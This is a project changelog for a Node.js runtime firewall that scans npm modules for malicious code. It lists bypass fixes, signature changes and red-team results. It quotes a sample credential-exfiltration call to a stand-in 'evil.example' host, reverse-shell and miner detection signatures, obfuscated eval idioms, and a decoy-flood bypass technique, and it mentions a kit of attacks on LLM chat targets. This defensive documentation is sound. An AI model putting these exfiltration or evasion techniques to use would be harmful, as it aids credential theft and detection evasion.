<!-- markdownlint-disable-file MD024 -->
# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Security

- **F-5.1 / P0-1: fixed the QUARANTINE proxy's callable/constructible crash (audit's sole
  explicit NO-SHIP condition).** `QuarantineStub.createProxy()` backed its Proxy with a plain
  object (`{}`) target. A Proxy is only callable/constructible if its *target* is — traps are
  never consulted otherwise — so calling or `new`-ing a function/class-shaped quarantined
  dependency threw a native, uncatchable-by-the-firewall TypeError instead of being safely
  neutered. The target is now a real function (both callable and constructible), with new
  `apply`/`construct` traps that record the interception and gracefully degrade (return `null`
  / a fresh inert quarantine proxy) without ever executing the real quarantined code. That
  target unavoidably owns one non-configurable own property (`prototype`, spec-mandated for
  every ordinary function); the `ownKeys`/`getOwnPropertyDescriptor`/`has`/`deleteProperty`/
  `defineProperty` traps now defer to the target's real descriptor for any non-configurable (or,
  once frozen, any real) own key instead of unconditionally pretending it's absent — the same
  Proxy-invariant-violation crash class as F-63, now closed for the one key that a callable
  target inescapably carries. Existing property/read/write/enumeration behavior for every other
  (forgeable) key is unchanged. Added regression coverage to `quarantine-unit-test.js`: proxy()
  and `new proxy()` no longer throw and never execute real code; `prototype`'s presence,
  non-deletability, and descriptor survive `Object.keys()`/`Reflect.ownKeys()`/
  `getOwnPropertyDescriptors()` without an invariant-violation TypeError.

- **F-91: closed a span-exhaustion bypass in the AST tier (`FW_ENABLE_AST=1`).** The scanner
  processed candidate spans in **file-position order** and hard-stopped after a fixed count
  (`MAX_SPANS_PER_FILE = 40`), so an attacker could place >40 harmless prescreen-matching decoy
  spans *ahead of* the real payload and the payload span was never parsed — a deterministic
  AST-tier bypass even with detection fully enabled (reproduced: a bracket-eval payload at offset
  ~87 KB behind 41 `String.fromCharCode` decoys went from `QUARANTINE`/CRITICAL to `OBSERVE`/zero
  detections). The AST tier now:
  - scans spans **highest-risk-first** (never in file order), with a per-trigger risk weight, so a
    real payload can't be starved of the parse budget by lower-risk decoy spans placed ahead of it;
  - splits the budget by risk tier — a large budget for rare high-risk obfuscation shapes, the
    original small budget for ordinary bundle noise (`require()`/`(0, x)`/`.join()`), so large
    legitimate bundles are unaffected;
  - reports an **incomplete** scan when a genuinely high-risk span is left unanalyzed, governed by
    the new `FW_AST_INCOMPLETE_POLICY`. Because an incomplete scan is itself the span-exhaustion
    attack shape, the default is **fail-closed** (`quarantine`/`block`) so the bypass is closed by
    default rather than only for operators who opt in; `observe` opts down to WARN-only telemetry.
    Only fires on pathological saturation (>256 rare high-risk spans in one module); 0 FP across the
    AST-enabled benign soak, including under quarantine.
- Added regression coverage: unit assertions for the payload at the front/middle/end of a decoy
  flood and for the incomplete-gate boundary (`packages/fw-agent/test/ast-scan-unit-test.js`); a
  test through the **real preload hook** (`packages/fw-agent/test/ast-exhaustion-preload-test.js`);
  and three red-team corpus entries (`dce-span-exhaustion-{front,middle,end}`).

### Changed

- **Documentation truth-up for the npm-shipped README** (`packages/fw-agent/README.md`) and package
  `description`: removed the stale "Detection is signature + behavioral, not AST-based" claim and
  the "blocks malicious npm modules" framing; documented `FW_ENABLE_AST`, `FW_AST_INCOMPLETE_POLICY`,
  `FW_ENABLE_CROSSFILE`, and `FW_CACHE_POLICY`; added the two-tier detection numbers (default vs.
  AST) and disclosed that "0 false positives" is measured only across the 33 curated benign
  controls. Reframed the package as opt-in runtime enforcement for supported module-loading paths,
  defense-in-depth rather than comprehensive malware prevention.

### Added

- **`redteam-kit-adapter` red-team category** (`red-team/corpus/redteam-kit-adapter.js`, 17
  entries): reconstructs 14 attack techniques from the sibling
  [`aletheia-redteam-kit`](https://github.com/holeyfield33-art/aletheia-redteam-kit) repo's attack
  catalog (`attacks/`) as real malicious Node.js module source — the kit's own payloads are
  natural-language instructions for an LLM chat target and don't apply to this firewall's
  code-scanning threat model, so each entry reconstructs the underlying technique rather than
  replaying the kit's text, mirroring the "reconstruct, never copy" principle the kit's own
  `adapters/aegis/shim.mjs` uses for its non-chat targets. Plus 3 benign controls. Full run
  (`npm run redteam` / `npm run redteam:ast`) is clean: 10/14 (default) and 11/14 (AST) malicious
  entries caught, the remaining 3 reproduce already-documented accepted gaps in
  `docs/THREAT-COVERAGE.md`, and the 1 gap closed only under `FW_ENABLE_AST=1`
  (`confusable-identifier-evasion`, a Unicode-homoglyph `eval` alias) confirms the Phase 3 AST tier
  generalizes to a new obfuscation variant beyond the original corpus. 0 false positives on the
  benign controls. See `red-team/README.md` § Redteam-kit adapter.

### Security

- Bumped `fastify` to the latest patch in `packages/fw-control`'s private control-plane workspace,
  closing a moderate schema-validation-bypass and `X-Forwarded-*`-spoofing advisory pair
  (GHSA-w2qp-rph6-63g4, GHSA-3m5p-2c4r-xxw2), and ran `npm audit fix` for the transitive `fast-uri`
  high-severity host-confusion/SSRF advisories pulled in via `ajv`. `packages/fw-control` is a
  private dev-only workspace, never published — the zero-runtime-dependency `aletheia-firewall`
  tarball (`packages/fw-agent`) was unaffected either way. `npm audit --omit=dev` now reports 0
  vulnerabilities.

### CI

- **Publish workflow hardening** (`.github/workflows/publish.yml`): pinned every third-party action
  to a reviewed full commit SHA (`actions/checkout`, `actions/setup-node`,
  `softprops/action-gh-release`) and pinned the release npm CLI to an exact version (`npm@11.5.1`)
  instead of the mutable `npm@latest`. The workflow now **builds the exact release tarball, inspects
  it, installs it into a clean project, and runs a tarball smoke suite** (clean load, self-integrity,
  CJS blocking, AST tier, enforcement mode, ESM interception) on Node 18/20/22/24 before publishing —
  and publishes that same `.tgz` verbatim, rather than only `npm pack --dry-run` and re-packing at
  publish time (`scripts/smoke-tarball.js`).

## [0.6.0] - 2026-08-27

### Added

- **Phase 3 AST-level obfuscation detection (`FW_ENABLE_AST=1`, opt-in)** —
  `packages/fw-agent/src/ast-scan.js`: a new, hand-rolled, zero-runtime-dependency
  tokenizer/parser/constant-folder/structural-matcher, scoped narrowly to the expression grammar
  needed to see through the specific obfuscation idioms the red-team corpus has long tracked as
  `knownBypass: true` — bracket/alias/unicode-escape access to `eval`/`Function`, constructor-chase
  sandbox escapes (`(function(){}).constructor`, `Object.getPrototypeOf(function*(){}).constructor`),
  decode-primitive chains (`String.fromCharCode`, `.split('').reverse().join('')`,
  `decodeURIComponent`, `Buffer.from(...).toString()`), and literal string/path/specifier
  reassembly (`'ev'+'al'`, `['ch','ild'].join('')`, `'/etc/'+'sha'+'dow'`). No new detection
  *rules*: resolved obfuscation is fed into the existing signature and behavioral-correlation
  engines as additional signal positions and re-tested literals — `detector.js`'s
  `BLOCK_SIGNATURES`/`BLOCK_REGEXES` and `behavior-tracker.js`'s `DYNAMIC_CODE_EXEC_CHAIN` /
  `OBFUSCATED_CODE_EXECUTION` correlation rules are unchanged. A genuinely obfuscated
  access to `eval`/`Function`/`GeneratorFunction`, or an obfuscated `require()` of a sensitive
  module, is the one case this module reports as a standalone finding on its own (see
  `resolveIdentity()`'s direct-vs-obfuscated distinction) — everything else only ever widens what
  the existing engines can see. Every parse/fold error degrades to "no additional signal from this
  span," never a throw or a false block; the existing text-based scanners always run over full raw
  content regardless.
  - Ships **opt-in, off by default** (mirrors how `FW_ENABLE_CROSSFILE` was introduced): new,
    unproven parsing code touching a block-tier decision, not yet soak-tested against a large
    real-world corpus. Default-configuration detection behavior (and the default `npm run
    redteam` score) is byte-for-byte unchanged by this release.
  - Closes 21 of the 33 documented static-analysis bypasses when enabled — detection rate on the
    red-team corpus rises from 74.2% (95/128, default) to 90.6% (116/128, `FW_ENABLE_AST=1`) with 0
    false positives across the 33 curated benign controls (not a measured general FP rate). Run
    `npm run redteam:ast` to reproduce. See `docs/THREAT-COVERAGE.md` §4 for the exact
    closed/still-open list. (The corpus grew by 3 malicious span-exhaustion entries in F-91 below,
    shifting the pre-F-91 76.0%/95/125 → 90.4%/113/125 figures to these.)
  - **Explicitly does not close, by architectural necessity, not oversight**: WASM payloads (no
    JS source text exists to parse), values sourced only from `process.env`/runtime config (never
    a literal in source, so nothing for a static fold to resolve), and network+process-exec taint
    chains / low-and-slow C2 (need either cross-statement dataflow with real false-positive guards,
    or runtime network-egress allow/deny lists — separate future work, not AST's job).
- `npm run redteam:ast` / `red-team/run.js --enable-ast` — runs the red-team corpus with
  `FW_ENABLE_AST=1` so the AST tier's effect can be measured and reproduced independently of the
  default-posture `npm run redteam` run.
- Six new red-team `benign-controls` entries exercising the same primitives the AST pass inspects
  in legitimate ways (an ordinary `.constructor` type-check, `String.fromCharCode` building
  display text, `Buffer.from(...,'base64')` decoding ordinary data, `Array.join` building a
  non-sensitive message, a benign computed-property config lookup, and the standalone `(0, eval)`
  idiom used without a decode/exec chain) — folding literals and resolving call targets is a new
  false-positive surface distinct from the existing raw-text signal engine, and needed its own
  regression coverage.

## [0.5.0] - 2026-08-24

This release was held for three rounds of independent security review (PENTEST-003 through
PENTEST-005 below) before tagging — each round found and closed at least one real gap in the
round before it. See `SECURITY.md` for the full pentest-by-pentest writeup; this entry summarizes
the fixes that shipped.

### Security

- **Policy-signature forgery chain (F-71, F-80, F-83, F-84) — four rounds on the same function**:
  `canonicalPayload()` in `packages/fw-agent/src/policy-watcher.js` (and its byte-compatible
  offline-signer twin in `scripts/sign-policy.js`) builds the exact bytes an Ed25519 signature is
  checked against. Four independent review passes each found one more ambient global or
  interceptable operation this function depended on without protecting it — each fix real, each
  independently reproduced before being trusted:
  - **F-71** — `JSON.stringify`, `Object.keys`, `Array.prototype.sort`, and `Buffer.from` were
    called live rather than pristine-captured, so a post-load monkeypatch of any of them could
    decouple the bytes a signature covers from the rules object actually applied (letting a
    stale-but-genuine signature validate forged rules). Fixed: all four captured at module load,
    before any later-loaded code can run.
  - **F-80** — the key-sort copy loop built its target as a plain `{}`, populated via bracket
    assignment (`sorted[k] = rules[k]`) — a `[[Set]]` operation, not a primitive call, so it stayed
    interceptable independent of every F-71 capture. A literal `'__proto__'` key is silently
    swallowed by Object.prototype's own built-in accessor (no monkeypatch needed); an arbitrary key
    name is swallowed the same way if `Object.prototype` was polluted for it by earlier-running
    code. Either way, a policy tampered post-signing (raw JSON-text edit, no private key) to add
    the key still verified `VALID`. Fixed: build the copy target with `Object.create(null)` instead
    of `{}` — no inherited accessor anywhere in the chain to intercept.
  - **F-83** — the loop *reading* that sorted key array back out was still `for (const k of
    keysArray)`, which dispatches through `Array.prototype[Symbol.iterator]` — distinct from
    `Array.prototype.sort`, and never captured. A targeted `Symbol.iterator` override can pass
    through every legitimate key while silently dropping one forged key, reopening the same
    bypass shape through the iteration source rather than the assignment target. Fixed: iterate the
    sorted key array by index (`.length` + indexed access) instead of `for...of` — indexed access
    never dispatches through `Symbol.iterator`. `scripts/sign-policy.js`'s two separate copies of
    this loop (`canonicalPayload()` and `signPolicy()`) both had it and are both fixed.
  - **F-84** — the copy target's *construction*, `Object.create(null)` itself, was still the live
    ambient global. Monkeypatching `Object.create` to redirect the `proto === null` case reopens
    F-80's exact bug through yet another angle. Fixed: `Object.create` is now pristine-captured
    too, in both files (all three call sites). `FW_FREEZE_PROTOTYPES=1` does not mitigate this —
    `Object.create` is a constructor-function property, not a prototype one.

  `canonicalPayload()` now pristine-captures every ambient global involved in building its output
  (`JSON.stringify`, `Object.keys`, `Array.prototype.sort`, `Buffer.from`, `Object.create`) plus
  `crypto.verify`/`crypto.createHash` (F-62) — verified complete by a pentest pass specifically
  primed to look for exactly this class of gap, which found none.

- **Behavioral correlation evasion (F-69, F-73, F-81)**: `behavior-tracker.js`'s multi-signal
  correlation rules first moved from whole-file signal co-occurrence to a fixed 200-character
  window (F-43/F-68), then to statement/block **separator distance** (`; { }`) since any fixed
  character distance is defeatable with that many characters of padding (F-69). Two follow-on
  gaps in that redesign:
  - **F-73** — position tracking used the raw, unsanitized source for some signals while others
    used the comment/string-blanked `scanSrc` view, so a signal's reported position could
    correspond to text a *different* sanitization pass had already blanked — a comment-only
    mention of a path could contribute a real position despite the boolean check correctly
    ignoring it. Fixed: every signal's position now comes from the same sanitized view its match
    came from.
  - **F-81** — separator counting looked only for literal `;`/`{`/`}`, so arbitrarily many real
    statements written without semicolons or braces (relying on Automatic Semicolon Insertion)
    accumulated zero separators, silently defeating the documented "falls off at ≥5 statements"
    limit. Fixed: a newline terminating real (non-comment/whitespace) content now also counts.
    **Disclosed, not fixed**: a single arbitrarily long statement with no internal separator is
    still bounded only by the 8000-character backstop (`CORRELATION_MAX_CHARS`) — a mathematically
    inherent limit of fixed-threshold text-scanning correlation, proven unfixable by a first
    attempt rather than silently left unexamined, and tested at its exact boundary.

- **Cache-substitution enforcement — `require.cache` pre-seeding (F-58)**: `Module._load()` (the
  real `require()` entry point) checks `require.cache` *before* `Module.prototype._compile` runs,
  so wrapping only `_compile` left a gap — allowed code could insert a forged module (or a bare
  `{ exports }` object) directly into `require.cache[resolvedPath]` and `require()` returned the
  forged exports unscanned. `Module._load` is now wrapped with a three-state
  verified/unknown/blocked model, policy-controlled via `FW_CACHE_POLICY=block|audit|allow`
  (default `block` under `FW_MODE=enforce`, `audit` otherwise). Scope: closes `require.cache`
  pre-seeding that bypasses the scan path; does **not** close reassignment of the loader functions
  themselves — see F-70 below.

- **Scan CommonJS loaded through the ESM loader (F-79)**: `import x from 'some-cjs-package'` uses
  Node's CJS-through-ESM interop — the ESM `load` hook fires with `result.format === 'commonjs'`,
  `Module._cache` is populated, but `Module.prototype._compile` is never called. The hook
  previously early-returned for that case, which was **both** a detection gap (a malicious CJS
  module imported via ESM ran unscanned — blocked via `require()`, free via `import`) and a false
  positive (the later `require()` of the same package — e.g. `vite`/`astro` referencing
  `picomatch` as both `import` and `__require` — hit F-58's cache gate as "unverified" and was
  refused under `FW_CACHE_POLICY=block`). The interop-CJS source is now run through the **same**
  scan-and-policy path as `_compile` (shared implementation) and only then marked verified,
  closing both. Verified with a true-positive test (malicious CJS via `import` now blocked), a
  false-positive test (benign CJS imported-then-required loads clean under `block`), the unchanged
  cache-poisoning matrix, a full red-team run (0 regressions / 0 false positives), and a
  51-package popular-package soak under `FW_CACHE_POLICY=block` (0 false positives).

- **Pristine crypto method capture + dev-key rotation (F-62)**: `crypto.verify` / `crypto.createHash`
  are captured at each file's module top level, before any later-loaded code can monkeypatch the
  shared `crypto` module object, and used exclusively thereafter. The committed dev private key
  `scripts/dev-private-key.pem` was **deleted from `HEAD`** and `DEV_PUBLIC_KEY_PEM` rotated to a
  public key whose private half was never committed; there is no shared dev private key any more
  (see `SECURITY.md` → "Key revocation record").

- **Read-only enforcement/telemetry state (F-57, F-74)**: `policyMap` and `quarantinedModules` are
  no longer exported as live mutable `Map`/`Set` — replaced with read-only query functions
  (`hasPolicy`, `getPolicyDecision`, `isQuarantined`) so allowed code cannot mutate live
  enforcement state (F-57). `compileMetrics` is likewise no longer exported as the live object;
  a `getCompileMetrics()` accessor returns a frozen snapshot (F-74).

- **Quarantine Proxy `defineProperty` trap (F-63)**: added a pretend-success `defineProperty` trap
  matching the pattern already used by the other traps, so a subsequent enumeration no longer
  throws on a quarantined module's proxy.

- **Same-process loader-reassignment ceiling disclosed (F-70)**: `Module._load` (F-58's own
  enforcement point), `Module.prototype._compile`, and `module.registerHooks()` are writable by
  same-privilege code, which can capture the wrapped version and install a replacement that skips
  the check. Freezing them is neither cheap nor low-risk and does not escape the same-privilege
  domain, so it is **disclosed rather than "fixed"** — this is the inherent same-process ceiling,
  not a closable gap. See `SECURITY.md` → "F-70" and the strengthened same-process-ceiling note in
  `README.md`.

- **Multi-signal behavioral correlation redesigned around structural distance, not a character
  window (F-43/F-68)**: the correlation rules (`CREDENTIAL_EXFILTRATION` sensitive-path/`.npmrc`/
  config-store variants, `DYNAMIC_CODE_EXEC_CHAIN`, `OBFUSCATED_CODE_EXECUTION`, `REMOTE_FETCH_EXEC`)
  no longer fire on whole-file signal co-occurrence — they require the constituent signals to be
  genuinely correlated, eliminating false positives on large bundled/minified files (confirmed on
  the real `vite`/`astro` chunk and a multi-thousand-file real-corpus sweep, 0 false positives,
  100% true-positive retention). First shipped as a fixed 200-character window, then redesigned as
  separator distance (see F-69/F-73/F-81 above) once the character window itself proved
  padding-defeatable.

- **Self-integrity check now covers the full shipped runtime surface**: `verifySelfIntegrity()`
  and the baseline generator/CI check previously hashed only 7 of the package's executable files,
  omitting `src/aho-corasick.js` (the Aho-Corasick signature-matching engine required by both
  `detector.js` and `behavior-tracker.js`) and `sync-worker.js` (the telemetry worker loaded at
  runtime). A tampered `aho-corasick.js` — e.g. one whose `search()` returns no matches — passed
  the self-integrity check **and** silently defeated signature detection (a credential-exfil
  payload scanned to `OBSERVE` with zero detections). Both files are now included in the hashed
  set in `packages/fw-agent/index.js`, `scripts/generate-baseline.js`, and the CI
  self-integrity step (all three kept in lockstep), and `.helios-baseline` was regenerated.
  Tampering either file now fails closed (`Refusing to run`, exit 1).

### Added

- **ESM `import` / `import()` interception (P2-01)**: closes the gap where ES modules bypassed
  the firewall entirely (`Module.prototype._compile` is never invoked for ESM evaluation).
  `packages/fw-agent/index.js` now also registers a `module.registerHooks()` load hook — the
  synchronous, main-thread ESM Customization Hooks API (Node ≥22.15.0/≥23.5.0) — that reuses the
  same `detector`, `policyMap`, and content-hash cache the CommonJS path already uses. Practical
  effect: ESM modules now get real per-module `BLOCK`/`QUARANTINE` policy overrides (not just
  signature/behavioral scanning), and cross-file behavioral correlation (e.g.
  `CREDENTIAL_EXFILTRATION_CROSS_FILE`) now fires **across the CommonJS/ESM boundary** for a
  split attack spanning both module systems in the same package — independently verified, not
  just claimed. Dynamic `import()` is intercepted by the same mechanism as an inherent
  consequence (Node does not distinguish static vs. dynamic import at this hook).
  Below the Node ≥22.15.0/≥23.5.0 floor, ESM stays an honest, logged `UNSUPPORTED` bypass — never
  silently claimed as protected. `vm.runInNewContext()` and native `.node` addon loads remain
  out of scope (architecturally unreachable by any `_compile`/`registerHooks()`-based approach).
  See [`README.md`](README.md#coverage--limitations) and
  [`docs/THREAT-COVERAGE.md`](docs/THREAT-COVERAGE.md#execution-surface-coverage-which-code-paths-reach-the-detector-at-all)
  for the full breakdown, and `scripts/execution-surface-matrix.js` (`npm run test:matrix`) for
  the reproducible, per-path verdict.

- **`.agent/` — a 4-agent development-loop control plane (prototype)**: an orchestration
  contract (Boundary Engineer / Red-Team Verifier / Release Warden / Docs Scribe) for running
  future firewall changes through a deterministic, independently-verified gate before any
  registry sync or human release approval — no agent can promote its own work, no model output
  overrides the gate's `PASS`/`BLOCK`/`FREEZE` verdict. Proven on a throwaway task across all
  required states before being pointed at real code, then proven on this ESM fix as the first
  real (non-throwaway) run — including a genuine `FREEZE` on a previously-unexercised interaction
  between the self-integrity baseline and the gate's forbidden-path check, resolved with a
  narrow, mechanically-verified carve-out rather than a policy loosening. Not part of the
  package's runtime surface (dev-tooling only, gitignored per-run evidence). See `.agent/README.md`.

### Fixed

- **Execution-surface matrix "ESM static import" row now tests a genuine static `import`
  declaration**: it previously used `await import()` inside the test fixture — dynamic-import
  syntax, not a real static declaration, despite the row's name. A real static import failure is
  uncatchable in-process (the whole module fails to evaluate), so the matrix coordinator's
  crash-classification logic was generalized to recognize a `[Firewall]`-tagged crash as
  `INTERCEPTED` rather than misreporting it as `UNSUPPORTED`.

## [0.4.0] - 2026-08-11

### Added

- **Red-team attack suite (`red-team/`, `npm run redteam`)**: A standalone adversarial harness that
  fires **151 malicious/benign JavaScript module payloads** (125 malicious, 26 benign) through
  `Detector.scanModuleSync` using the exact block rule `index.js` applies (a non-`warnOnly` detection
  → BLOCKED), and logs what gets **blocked (QUARANTINE)** vs. what gets **through (OBSERVE)**. It
  emits `results/redteam-summary.json` with a per-category rollup, a `gap_report` of everything that
  bypassed, and a false-positive list. Verdicts are `caught` / `known-bypass` / `REGRESSION` / `clean`
  / `FALSE-POSITIVE`; the suite fails (exit 1) only on a `REGRESSION` (a new hole) or a `FALSE-POSITIVE`
  (over-block), so it doubles as a CI guardrail (wired into `.github/workflows/ci.yml`). Corpus covers
  crypto-miners, reverse shells, credential exfil, dynamic-code execution, supply-chain stagers, and
  benign controls, split into core + `-extended` catalogs. Methodology mirrors the `aletheia-redteam-kit`
  command-center flow, adapted to this firewall's module-source input surface. Current run: 95/125
  malicious caught (76%), 0 false positives, 30 documented static-analysis bypasses. See
  [`red-team/README.md`](red-team/README.md) and [`docs/THREAT-COVERAGE.md`](docs/THREAT-COVERAGE.md).

### Fixed

- **`c8` pinned to `^10.1.3` (down from `^12.0.0`) so the fw-agent coverage gate runs on Node 18**:
  `c8@12` depends on `yargs@18`, which is ESM-only; `c8`'s CLI does a synchronous `require('yargs')`,
  which throws `ERR_REQUIRE_ESM` on any Node version without synchronous `require(esm)` support
  (Node 18 never got this — it landed in Node 20.19+ / 22.12+). This broke `npm run test:coverage`
  under Node 18 specifically, failing the `fw-agent` CI job's Node 18 leg even though every other
  suite (unit, adversarial, red-team, integration, live) passed fine. `c8@10.1.3` is the last major
  with a CJS-compatible `yargs`. `c8@12+` requires Node 20+.

- **Control plane fails fast with an actionable message when `fastify` is missing**: `packages/fw-control/src/server.js`
  now wraps the `require('fastify')` in a guard. Starting the control plane / `/logs` dashboard before
  running `npm install` previously crashed instantly with a raw `Cannot find module 'fastify'` stack
  trace (the server "loads and turns right off"); it now prints
  `the "fastify" dependency is not installed` plus the exact fix (`npm install && npm run start:control`)
  and exits 1. Documented the `npm install` prerequisite in the README Quick Start.

- **Flaky `policy-unit-test.js` "verifyPolicyIntegrity true when hash matches" case made deterministic**:
  The test built a policy object with no `created_at`, so `createCanonicalObject()` stamped a fresh
  `new Date().toISOString()` when computing the stored hash and *again* inside `verifyPolicyIntegrity()`.
  When the millisecond rolled over between the two calls the hashes diverged and the assertion failed
  (~1 in 8 runs), turning `npm test` red intermittently. The test now pins `created_at`, mirroring a
  real signed policy (which always carries the field). No change to `policy.js` or the self-integrity
  baseline.

### Security

- **F-31 (HIGH) — base64/hex-decode → eval obfuscation is now blocked**: A comment-free
  `Buffer.from(blob,'base64').toString(); eval(payload)` module — the classic "unpack an opaque
  blob, then evaluate it" dropper — previously fell through as `OBSERVE` (module ran). `buffer.from`
  and `eval(` are WARN-only signatures (F-20, since both appear in legitimate build tools), and no
  behavioral rule covered the *decode-then-execute* combination. The one adversarial test that
  claimed to cover this only passed because its fixture carried a `// Encodes: require('child_process').exec(...)`
  comment whose plaintext `child_process`/`exec` strings (matched against raw content) completed
  `DYNAMIC_CODE_EXEC_CHAIN` — so it blocked for the wrong reason and masked the gap. Added a new
  behavioral rule `OBFUSCATED_CODE_EXECUTION` (HIGH → hard block): a base64/hex decode primitive
  (`Buffer.from(…,'base64'/'hex')` / `atob`) matched against comment-stripped source **and** a
  dynamic-code primitive (`eval`/`new Function`/`vm`). Neither primitive blocks alone (F-20 preserved),
  and decode-only, eval-only, bare `Buffer.from(x)` (byte copy, no encoding), and a decode named only
  in a comment are all verified non-blocking. The misleading fixture was stripped of its comment and
  now blocks via the real rule; a comment-free regression test and false-positive guards were added.
  **Engine change — mirror in aletheia-registry:** the new `CODE_DECODE` signal + `OBFUSCATED_CODE_EXECUTION`
  rule live in `packages/fw-agent/src/behavior-tracker.js` (`SIGNAL_PATTERNS`), which the registry
  keeps its own copy of.

- **F-32 (MEDIUM) — `FW_STRICT_PRELOAD` is no longer spoofable**: The strict-preload guard decided
  "was I injected via `--require`" by substring-searching the *joined* `process.execArgv` for
  `fw-agent`/`helios`/`aletheia-firewall`. `node -e "require('./packages/fw-agent')"` puts the whole
  inline script (containing `fw-agent`) into `execArgv`, so the check reported "preloaded" and silently
  no-op'd — defeating the guarantee. It now parses `execArgv` for an actual `--require`/`-r` flag whose
  value resolves to this agent module.

- **F-33 (MEDIUM) — production dev-key guard fires without a policy file**: The dev-key refusal lived
  inside `PolicyWatcher.start()`, which returns early when no `policy.signed.json` exists — so a
  production deploy running the public dev key with no policy file on disk got zero signal (and a
  policy dropped in later could be hot-loaded). Added `assertProductionKeyConfig()` (exported from
  `policy-watcher.js`), called at agent startup before the watcher: refuses to start when
  `NODE_ENV=production` and the bundled dev key is in use without `FW_ALLOW_DEV_POLICY_KEY=1`,
  regardless of policy-file presence.

### Fixed

- **F-34 (LOW) — `DYNAMIC_MODULE_LOAD` doc/behavior consistency**: The detector marks MEDIUM
  behavioral violations `warnOnly`, so `index.js`'s `hasMediumOnly` quarantine branch was dead code —
  `require(variable)` actually resulted in `OBSERVE` (module runs), contradicting the README's
  "MEDIUM → quarantine". Since non-literal `require` is pervasive in legitimate code, the safe
  observe behavior is correct; the docs were wrong. Removed the dead branch and aligned the docs
  (surfaced as telemetry, not blocked).

- **F-35 (tooling) — coverage gate, CI wiring, reproducible baseline, corrected audits**: Added `c8`
  and a `test:coverage` gate (≥95% lines/functions on the five engine-core files:
  detector/behavior-tracker/aho-corasick/policy/quarantine — currently 100% lines/functions). New
  `behavior-tracker-unit-test.js` (the 265-line behavioral core previously had no direct test) and
  `policy-unit-test.js`. Wired `test:integration` and `test:live` into CI (previously defined but
  never run there) and added the coverage gate. `detection-live-test.js`'s obfuscated fixture was a
  no-op (`Buffer.from('aWYo')` with no encoding arg → `eval` threw a `ReferenceError`, never blocked);
  replaced with a real base64-decode+eval payload so `test:live` genuinely reports `Blocked: 2`.
  Added `scripts/generate-baseline.js` (reproducible `.helios-baseline` regeneration) and corrected
  `scripts/audit-{1,2,3}-*.sh` so the launch-readiness audits pass against real state (adversarial
  count is data-driven not "16 passed"; demo block counted via the `[BLOCKED]` line the demo actually
  prints, not the `[COMPILATION LOCKDOWN]` string it filters out; live `Blocked: 2`).

- **Docs — accuracy pass**: Fixed the `packages/fw-agent/README.md` self-contradiction (policy
  verification described as "SHA-256… not cryptographic signing" — it is Ed25519 since F-02), removed
  the stale "Behavioral Detection Limitations" section (sub-100B and inline-require gaps fixed by
  F-07/F-08), corrected signature counts and bypass tables (added Variable-alias eval; `Buffer.from→eval`
  now genuinely blocked), and replaced the unsigned `{ "rules": … }` policy examples in the root README,
  package README, and `docs/DEMO.md` (which fail signature verification → emergency lockdown) with the
  `scripts/sign-policy.js` signing workflow. Added `docs/THREAT-COVERAGE.md` — the authoritative,
  test-backed protection/bypass matrix.

- **F-30 redo (behavioral false negative) — `.npmrc`-theft escalation missed the common attack, only the sophisticated one**: The first cut of F-30 (never applied to this repo — it landed only in `aletheia-registry`'s `engine/` copy, diverging from this source of truth) split `.npmrc` reads out of `SENSITIVE_PATH` into their own weaker `NPMRC_READ` signal, then gated `CREDENTIAL_EXFILTRATION` escalation on the literal string `_authToken` appearing in the module. Real `.npmrc`-stealers don't parse the file for a field name — they read the whole file and ship it, or POST it as-is, and never name `_authToken`. That variant fell through as `NPMRC_NETWORK_EGRESS` (WARN) instead of CRITICAL — confirmed on both a whole-file exfil (`fetch('http://evil.example/c?d='+t)`) and a POST-body exfil, neither of which name any token field. The discriminator that actually holds is the *destination*, not whether a field is parsed out: legit npm tooling builds the request URL from `.npmrc`'s config (`fetch(`${registry}/${name}`)`); theft hardcodes it. `CREDENTIAL_EXFILTRATION` now also fires on an actual token/password field reference, an explicit `{host: '...'}` override, or a hardcoded call-site URL literal whose host isn't the real npm registry (`HARDCODED_EGRESS_CALL`, anchored to the network-call argument itself — matching "any quoted URL anywhere in the file" was tried and rejected during review because it false-positived on the common `registry = match ? m[1] : 'https://registry.npmjs.org'` fallback-default idiom). A hardcoded call-site fetch of the real `registry.npmjs.org` itself softens to WARN rather than a hard block, since some legit tools hardcode it directly instead of building it from config. Added 6 regression tests to the adversarial suite (24/24 passing): the two previously-missed theft patterns, a token+host-override combination, the original legit-tooling case, and two false-positive guards for the fallback-default and hardcoded-real-registry idioms. Verified: unit/adversarial/integration/auth suites green, `.helios-baseline` regenerated and matching, and — freshly downloaded — `@vantaloom/cli` and `@vantaloom/runtime-linux-x64` both WARN (not CRITICAL) on their real `.npmrc`-reading registry-resolution code.

- **F-29 (signature false positive) — BLOCK signature literals matched ordinary English**: Two `BLOCK_SIGNATURES` Aho-Corasick literals were common-enough substrings to false-positive on legitimate code: bare `'stratum'` matched the word wherever it occurred in prose (dictionary/word-list packages containing "stratum", "substratum", "stratus" — confirmed on `@danielhaim/titlecaser`, flagged as a crypto-miner for shipping an English dictionary), and bare `'bash -i'` / `'sh -i'` matched unrelated interactive-shell invocations (`push -i`, `fish -i`, `wash -i`, ...). Signatures are now specific to what real malicious payloads actually contain: `'stratum+tcp'` / `'stratum://'` (the mining-pool URL scheme, not the bare word) and `'bash -i >&'` / `'sh -i >&'` (the reverse-shell stdio-redirect idiom, not bare interactive-shell flags). `detector-unit-test.js`'s crypto-miner assertion (previously `// stratum` in a comment) now uses a real `stratum+tcp://` pool URL so it no longer encodes the false positive. Added adversarial regression test 18 (a word list containing "stratum"/"substratum"/"stratus" → clean). Verified: unit tests pass, adversarial suite 18/18, auth tests pass, `.helios-baseline` regenerated and matches, soak 0% FP / 100% TP (`results/soak-2026-07-15.jsonl`), `@danielhaim/titlecaser` loads CLEAN, and the miner true positive (`stratum+tcp://pool.hashvault.pro:8080`) is still BLOCKED.

